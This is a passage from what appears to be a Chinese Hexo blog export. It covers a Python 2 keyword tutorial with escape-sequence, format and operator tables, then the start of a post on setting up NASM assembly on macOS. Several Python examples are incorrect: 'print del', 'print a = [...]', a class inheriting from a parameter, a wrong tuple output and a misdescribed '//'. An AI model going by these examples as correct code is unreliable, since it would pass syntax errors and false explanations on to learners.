<span class="keyword">or</span> <span class="string">"a"</span><span class="comment"># a</span></span><br><span class="line"><span class="keyword">print</span> <span class="keyword">False</span> <span class="keyword">or</span> <span class="string">"b"</span> <span class="keyword">or</span> <span class="number">3</span><span class="comment"># b</span></span><br></pre></td></tr></table></figure></p><h2 id="not"><a href="#not" class="headerlink" title="not"></a><strong>not</strong></h2><p>逻辑否。除了 False，其他都是 True。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">print</span> <span class="keyword">not</span> <span class="literal">False</span># <span class="literal">True</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="keyword">not</span> <span class="string">"3"</span># <span class="literal">False</span></span><br></pre></td></tr></table></figure></p><h2 id="del"><a href="#del" class="headerlink" title="del"></a><strong>del</strong></h2><p>删除。<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print a = [<span class="number">1</span>, [<span class="number">2</span>*<span class="number">4</span>, <span class="string">"3"</span>]]# [<span class="number">1</span>, [<span class="number">8</span>, <span class="string">'3'</span>]]</span><br><span class="line">print del a[<span class="number">1</span>:<span class="number">1</span>]# [<span class="number">1</span>, [<span class="number">8</span>, <span class="string">'3'</span>]]</span><br><span class="line">print del a[<span class="number">1</span>:<span class="number">2</span>]# [<span class="number">1</span>]</span><br></pre></td></tr></table></figure></p><h2 id="import"><a href="#import" class="headerlink" title="import"></a><strong>import</strong></h2><p>导入模块。查找模块的顺序：程序所在文件夹-&gt;标准库的安装路径-&gt;环境变量中 path 包含的路径<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'================Python import mode================'</span>)</span></span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> sys<span class="selector-class">.path</span>:</span><br><span class="line">    print i</span><br></pre></td></tr></table></figure></p><h2 id="import-as"><a href="#import-as" class="headerlink" title="import+as"></a><strong>import</strong>+<strong>as</strong></h2><p>使用自定义的别名导入模块。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys as sss</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'================Python import mode================'</span>)</span></span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> sss<span class="selector-class">.path</span>:</span><br><span class="line">    print i</span><br></pre></td></tr></table></figure></p><h2 id="from"><a href="#from" class="headerlink" title="from"></a><strong>from</strong></h2><p>和 import 一起，用于导入特定模块。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from sys import path</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'================python from import================'</span>)</span></span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> path:</span><br><span class="line">    print i</span><br></pre></td></tr></table></figure></p><p>也可以直接用<code>*</code>导入所有的模块。<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'================python from * ================'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="built_in">print</span> i</span><br></pre></td></tr></table></figure></p><h2 id="while"><a href="#while" class="headerlink" title="while"></a><strong>while</strong></h2><p>基本循环。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">i</span> = <span class="number">0</span></span><br><span class="line">while <span class="selector-tag">i</span> &lt; <span class="number">4</span>:</span><br><span class="line">    print i</span><br><span class="line">    <span class="selector-tag">i</span> += <span class="number">1</span></span><br></pre></td></tr></table></figure></p><h2 id="with-as"><a href="#with-as" class="headerlink" title="with+as"></a><strong>with</strong>+<strong>as</strong></h2><p>用于对资源访问进行控制的场合，作为 try/finally 编码范式的一种替代。<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">with</span> open(<span class="string">"test.py"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="class"><span class="keyword">data</span> = file.read()</span></span><br><span class="line">    print <span class="class"><span class="keyword">data</span></span></span><br></pre></td></tr></table></figure></p><p>等于<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> = <span class="keyword">open</span>(<span class="string">"test.py"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = <span class="keyword">file</span>.<span class="keyword">read</span>()</span><br><span class="line">    <span class="keyword">print</span> data</span><br></pre></td></tr></table></figure></p><p>实际上是这样,利用 <code>__exit__</code> 中的 val，type，trace 来处理异常。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sample</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"In __enter__()"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Foo"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, type, value, trace)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"In __exit__()"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sample</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> Sample()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> get_sample() <span class="keyword">as</span> sample:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"sample "</span>, sample</span><br></pre></td></tr></table></figure></p><h2 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if+elif+else"></a><strong>if</strong>+<strong>elif</strong>+<strong>else</strong></h2><p>没有 switch，但是有 elif。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="selector-tag">a</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> == <span class="number">1</span>:</span><br><span class="line">        print <span class="selector-tag">i</span> + <span class="number">1</span></span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="number">2</span>:</span><br><span class="line">        print <span class="selector-tag">i</span> + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print <span class="selector-tag">i</span> + <span class="number">3</span></span><br></pre></td></tr></table></figure></p><h2 id="global"><a href="#global" class="headerlink" title="global"></a><strong>global</strong></h2><p>全局变量。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Before'</span>, x</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Changed'</span>, x</span><br><span class="line">x = <span class="number">50</span></span><br><span class="line">change()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'After all the changes'</span>, x</span><br></pre></td></tr></table></figure></p><p>没有这个 global 的话会直接报错说x没有赋值（Python 2.7.10）</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a><strong>assert</strong></h2><p>断言。可自定义AssertionError错误。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf -8 -*-</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> gethostname, gethostbyname</span><br><span class="line"><span class="keyword">from</span> exceptions <span class="keyword">import</span> AssertionError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_local_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">       Return local host ip.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    ip = gethostbyname(gethostname())</span><br><span class="line">    <span class="keyword">assert</span> ip != <span class="string">'127.0.1.1'</span>, <span class="string">'''</span></span><br><span class="line"><span class="string">    No network connect, please the network connect again!</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> get_local_ip()</span><br><span class="line"><span class="keyword">except</span> AssertionError,  e:</span><br><span class="line">    <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></p><p>这里 ip 是 <code>127.0.1.1</code> 的时候就会报错<code>No network connect, please the network connect again!</code></p><h2 id="pass"><a href="#pass" class="headerlink" title="pass"></a><strong>pass</strong></h2><p>空语句。为保证程序结构的完整性，用于占位。</p><h2 id="yield"><a href="#yield" class="headerlink" title="yield"></a><strong>yield</strong></h2><p>把函数变成生成器。<br><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/" target="_blank" rel="noopener">Python yield 使用浅析 - 廖雪峰</a><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">def</span> fab(max): </span><br><span class="line">    n, a, <span class="keyword">b </span>= <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line">    <span class="meta">while</span> n &lt; max: </span><br><span class="line">        <span class="keyword">yield </span><span class="keyword">b </span></span><br><span class="line">        a, <span class="keyword">b </span>= <span class="keyword">b, </span>a + <span class="keyword">b </span></span><br><span class="line">        n = n + <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>这时，fab(5) 这个『实例』就具有了类似 xrange() 占用内存小的特点，它也变成了一个生成器：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fab(50):</span><br><span class="line"><span class="builtin-name">print</span> i</span><br></pre></td></tr></table></figure></p><p>也可以手动调用 fab(5) 的 next() 方法（因为 fab(5) 是一个 generator 对象，该对象具有 next() 方法）</p><h2 id="break"><a href="#break" class="headerlink" title="break"></a><strong>break</strong></h2><p>跳出循环。用于终止 for ，while 的循环语句。如果有多层嵌套，也只会跳出最里层的循环。</p><h2 id="try-except-finally"><a href="#try-except-finally" class="headerlink" title="try+except+finally"></a><strong>try</strong>+<strong>except</strong>+<strong>finally</strong></h2><p>用于捕获异常。尝试运行这个代码，然后把 <code>1/0</code> 改成 <code>1/1</code> 再试试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'something wrong happened..'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'it seems i cannot be with except'</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'whatever happened, this line will be executed'</span></span><br></pre></td></tr></table></figure></p><h2 id="print"><a href="#print" class="headerlink" title="print"></a><strong>print</strong></h2><p>输出到控制台。</p><h2 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h2><p>类定义。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animal</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for animal"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></span><br><span class="line">        super(animal, self).__init__()</span><br><span class="line">        self.arg = arg</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bark</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"ooo!"</span></span><br><span class="line"></span><br><span class="line">    Name = name</span><br></pre></td></tr></table></figure></p><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a><strong>exec</strong></h2><p>执行python语句，which储存在字符串或者文件中。<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> '<span class="keyword">print</span> <span class="string">"hello world"</span>'</span><br></pre></td></tr></table></figure></p><h2 id="in"><a href="#in" class="headerlink" title="in"></a><strong>in</strong></h2><p>查找字符串。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = <span class="string">"abcdefg"</span></span><br><span class="line"><span class="function"><span class="title">input</span><span class="params">(<span class="string">"please input a character"</span>)</span></span> <span class="keyword">in</span> a</span><br></pre></td></tr></table></figure></p><p>返回 True 或 False</p><h2 id="raise"><a href="#raise" class="headerlink" title="raise"></a><strong>raise</strong></h2><p>抛出自定义异常。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">     s = <span class="keyword">None</span></span><br><span class="line">     <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">         <span class="keyword">print</span> <span class="string">"s 是空对象"</span></span><br><span class="line">         <span class="keyword">raise</span> NameError     <span class="comment">#如果引发NameError异常，后面的代码将不能执行</span></span><br><span class="line">     <span class="keyword">print</span> len(s)</span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">"空对象没有长度"</span></span><br></pre></td></tr></table></figure></p><h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a><strong>continue</strong></h2><p>跳出本次循环。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="keyword">range</span>(10):</span><br><span class="line">    <span class="keyword">if</span> x == 5:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> x</span><br></pre></td></tr></table></figure></p><p>输出没有5，被 continue 跳过了。</p><h2 id="is"><a href="#is" class="headerlink" title="is"></a><strong>is</strong></h2><p>is检查两个对象是否是同一个对象,而==检查他们是否相等。<br>其实python中的is比较的对象很像C语言中的指针,只有地址相同的指针才是同一个指针。  </p><h2 id="return"><a href="#return" class="headerlink" title="return"></a><strong>return</strong></h2><p>为函数返回值。和其他的语言一样。</p><h2 id="def"><a href="#def" class="headerlink" title="def"></a><strong>def</strong></h2><p>定义函数。<br><a href="http://www.cnblogs.com/dolphin0520/archive/2013/03/14/2954733.html" target="_blank" rel="noopener">Python中的函数（一）</a><br><a href="http://www.cnblogs.com/dolphin0520/archive/2013/03/18/2966674.html" target="_blank" rel="noopener">Python中的函数（二）</a><br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def <span class="built_in">display</span>(a=<span class="string">'hello'</span>,b=<span class="string">'wolrd'</span>):</span><br><span class="line">    <span class="built_in">print</span> a+b</span><br><span class="line"></span><br><span class="line"><span class="built_in">display</span>()</span><br><span class="line"><span class="built_in">display</span>(b=<span class="string">'world'</span>)</span><br><span class="line"><span class="built_in">display</span>(a=<span class="string">'hello'</span>)</span><br><span class="line"><span class="built_in">display</span>(<span class="string">'world'</span>)</span><br></pre></td></tr></table></figure></p><p>可以在定义时提供缺省值。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def <span class="keyword">insert</span>(<span class="keyword">a</span>,L=[]):</span><br><span class="line">    L.<span class="keyword">append</span>(<span class="keyword">a</span>)</span><br><span class="line">    <span class="keyword">print</span> L</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span>(<span class="string">'hello'</span>)# [<span class="string">'hello'</span>]</span><br><span class="line"><span class="keyword">insert</span>(<span class="string">'world'</span>)# [<span class="string">'hello'</span>, <span class="string">'world'</span>]</span><br></pre></td></tr></table></figure></p><p>在重复调用函数时默认形参会<strong>继承之前一次</strong>调用结束之后该形参的值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printvalue</span><span class="params">(a, **d)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'a = %d'</span> % a</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> d:</span><br><span class="line">        <span class="keyword">print</span> x + <span class="string">' = %d'</span> % d[x]</span><br><span class="line"></span><br><span class="line">printvalue(a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></p><p><code>*</code> 和 <code>**</code> 表示能够接受0到任意多个参数，<code>*</code> 表示将没有匹配的值都放在同一个元组中，’**’表示将没有匹配的值都放在一个dictionary中。<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def <span class="function"><span class="keyword">function</span><span class="params">()</span></span>:</span><br><span class="line">    x=<span class="number">2</span></span><br><span class="line">    y=[<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> x,y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span># &lt;<span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]&gt;</span><br></pre></td></tr></table></figure></p><h2 id="for"><a href="#for" class="headerlink" title="for"></a><strong>for</strong></h2><p>循环。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span> = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(li)):</span><br><span class="line">    print <span class="selector-tag">li</span>[i]</span><br></pre></td></tr></table></figure></p><h2 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a><strong>lambda</strong></h2><p>匿名定义函数。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g = lambda x : x*<span class="number">*2</span></span><br><span class="line"><span class="builtin-name">print</span> g(4)</span><br></pre></td></tr></table></figure></p><p>等于<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> x**<span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> f(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p><hr><h1 id="字符串转义序列-Escape-Sequences"><a href="#字符串转义序列-Escape-Sequences" class="headerlink" title="字符串转义序列(Escape Sequences)"></a>字符串转义序列(Escape Sequences)</h1><p><code>\\</code> 反斜杠<br><code>\&#39;</code> 单引号<br><code>\&quot;</code> 双引号<br><code>\a</code> 响铃<br><code>\b</code> 退格<br><code>\f</code> 换页<br><code>\n</code> 换行<br><code>\r</code> 回车<br><code>\t</code> 横向制表符<br><code>\v</code> 纵向制表符</p><hr><h1 id="字符串格式化-String-Formats"><a href="#字符串格式化-String-Formats" class="headerlink" title="字符串格式化(String Formats)"></a>字符串格式化(String Formats)</h1><p><code>%d</code> 十进制整数<br><code>%i</code> 十进制整数<br><code>%o</code> 八进制整数<br><code>%u</code> 十进制整数<br><code>%x</code> 十六进制整数 小写<br><code>%X</code> 十六进制整数 大写<br><code>%e</code> 指数<br><code>%E</code> 指数<br><code>%f</code> 浮点数<br><code>%F</code> 浮点数<br><code>%g</code> 根据显示长度为指数或浮点数<br><code>%G</code> 根据显示长度为指数或浮点数<br><code>%c</code> 单个字符<br><code>%r</code> 字符串 repr()<br><code>%s</code> 字符串 str()<br><code>%%</code> 字符%</p><hr><h1 id="操作符号"><a href="#操作符号" class="headerlink" title="操作符号"></a>操作符号</h1><p><code>+</code> 加<br><code>-</code> 减<br><code>*</code> 乘<br><code>**</code> 次方<br><code>/</code> 除<br><code>//</code> 浮点除，四舍五入<br><code>%</code> 取余数<br><code>&lt;</code> 小于<br><code>&gt;</code> 大于<br><code>&lt;=</code> 小于等于<br><code>&gt;=</code> 大于等于<br><code>==</code> 等于<br><code>!=</code> 不等于<br><code>&lt;&gt;</code> 不等于<br><code>( )</code> 元组<br><code>[ ]</code> 列表<br><code>{ }</code> 字典<br><code>@</code> 从第一个函数修饰符开始，自下而上做参数传递，这样实际是使用了约定的函数修饰符达到函数嵌套的目的。<br><code>,</code> 参数传递时分隔，元组转换，输出无换行<br><code>:</code> 函数，循环，if条件，类定义等后面有冒号<br><code>.</code> 调用某个类的方法或成员<br><code>=</code> 赋值<br><code>;</code> 语句结束<br><code>a += b</code> a = a + b<br><code>a -= b</code> a = a - b<br><code>a *= b</code> a = a * b<br><code>a /= b</code> a = a / b<br><code>a //= b</code> a = a // b<br><code>a %= b</code> a = a % b<br><code>a **= b</code> a = a ** b</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mac 下搭建汇编环境</title>
      <link href="/2015/11-18-assembly/"/>
      <url>/2015/11-18-assembly/</url>
      
        <content type="html"><![CDATA[<p>注意我搞的是32位的<br>汇编有很多不同的编译器，每个编译器的语法都不一样<br>尝试了 gcc，但是下载了半个小时卡在了 make 上面<br>也就是说我不能用 gcc 连接了，还好有 ld<br>然后查了好久才终于搞出来一个在 OSX 上面能够编译连接运行的汇编环境<br>sublime text 3 + x86 and x86_64 Assembly + nasm + zsh<br><a id="more"></a></p><hr><h1 id="装nasm"><a href="#装nasm" class="headerlink" title="装nasm"></a>装nasm</h1><p>看看有没有安装 nasm<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nasm -v</span></span><br></pre></td></tr></table></figure></p><p>没有就装一个，貌似 brew 上有，自己装一个<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>nasm</span><br></pre></td></tr></table></figure></p><p>安装好了的后查询版本应该是这样的<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NASM <span class="built_in">version</span> <span class="number">2.11</span><span class="number">.08</span> compiled <span class="keyword">on</span> MM DD YYYY</span><br></pre></td></tr></table></figure></p><hr><h1 id="高亮-补全插件-for-sublime"><a href="#高亮-补全插件-for-sublime" class="headerlink" title="高亮/补全插件 for sublime"></a>高亮/补全插件 for sublime</h1><p>装 sublime 和 package control的过程就不仔细讲了<br>找个补全和高亮的插件，我用的<code>x86 and x86_64 Assembly</code>  </p><hr><h1 id="写一个汇编的-hello-world"><a href="#写一个汇编的-hello-world" class="headerlink" title="写一个汇编的 hello world"></a>写一个汇编的 hello world</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">global</span> start</span><br><span class="line"></span><br><span class="line"><span class="meta">section</span> .text</span><br><span class="line"><span class="symbol">start:</span></span><br><span class="line">    <span class="keyword">push</span>    <span class="built_in">dword</span> msg.len</span><br><span class="line">    <span class="keyword">push</span>    <span class="built_in">dword</span> msg</span><br><span class="line">    <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">int</span>     <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">12</span></span><br><span class="line">    <span class="keyword">int</span>     <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="meta">section</span> .data</span><br><span class="line"></span><br><span class="line"><span class="symbol">msg:</span>    <span class="built_in">db</span>      <span class="string">"hello world"</span>, <span class="number">10</span></span><br><span class="line"><span class="symbol">.len:</span>   <span class="built_in">equ</span>     $ - msg</span><br></pre></td></tr></table></figure><p>我这里存为<code>32.asm</code>  </p><hr><h1 id="ld-命令"><a href="#ld-命令" class="headerlink" title="ld 命令"></a>ld 命令</h1><p>这个命令就是用来链接用的，没有的话请下载一个 Xcode<br>我相信你有  </p><hr><h1 id="编译-链接-运行"><a href="#编译-链接-运行" class="headerlink" title="编译/链接/运行"></a>编译/链接/运行</h1><p>注意，mac上面的gcc编译<code>.o</code>文件的时候默认的入口是<code>_main</code>，而使用<code>ld</code>命令时，默认的是<code>start</code>。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f macho <span class="number">32.</span>asm</span><br><span class="line">ld -macosx_version_min <span class="number">10.7</span><span 